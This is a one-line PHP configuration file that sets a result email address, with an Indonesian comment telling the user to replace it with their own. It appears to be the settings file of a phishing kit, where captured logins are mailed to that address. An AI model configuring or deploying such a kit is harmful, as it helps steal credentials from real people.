<?php
$emailku = 'resultpahmi@gmail.com'; // GANTI EMAIL KAMU DISINI
?>